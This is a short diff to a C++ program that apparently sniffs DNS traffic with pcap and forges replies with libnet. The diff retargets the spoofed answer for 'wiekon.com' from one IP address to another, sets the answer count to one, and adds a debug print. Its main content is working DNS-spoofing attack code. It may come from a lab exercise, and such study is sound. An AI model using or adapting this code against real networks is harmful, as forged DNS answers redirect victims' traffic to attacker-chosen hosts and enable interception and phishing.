@@ -105,7 +105,7 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 auto payload_s = snprintf(
                         payload,
                         sizeof payload,
-                        "%c%s%c%s%c%s%c%c%c%c%c",
+                        "%c%s%c%s%c%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
                         (char)strlen("wiekon"),
                         "wiekon",
                         (char)strlen("com"),
@@ -123,17 +123,17 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                         0x00, 0x01, // IN
                         0x00, 0x00, 0x00, 0x11, // 17 time to live: );
                         0x00, 0x04, //data length 4
-                        0xd5, 0xb4, 0x8d, 0x8c // onet.pl
+                        0xbc, 0xa5, 0xe9, 0x14 // yafud.pl
                 );
 
-                cout << payload_s << endl;
+                cout << "PayloadS" << payload_s << endl;
 
                 auto tag = libnet_build_dnsv4(
                         LIBNET_UDP_DNSV4_H, //const size of dns header - 12
                         (uint16_t)dns_qid(incoming_dns_header ), // transaction id
                         (uint16_t)(0 | (1 << 15)), // flags (set only first -> first indicate response)
                         1 /*dns_numqd(dns)*/, // question number
-                        0 /*dns_numan(dns)*/, // answer RR number
+                        1 /*dns_numan(dns)*/, // answer RR number
                         0, // auth RR number
                         0, // additional RR number
                         (const uint8_t*)payload, // payload
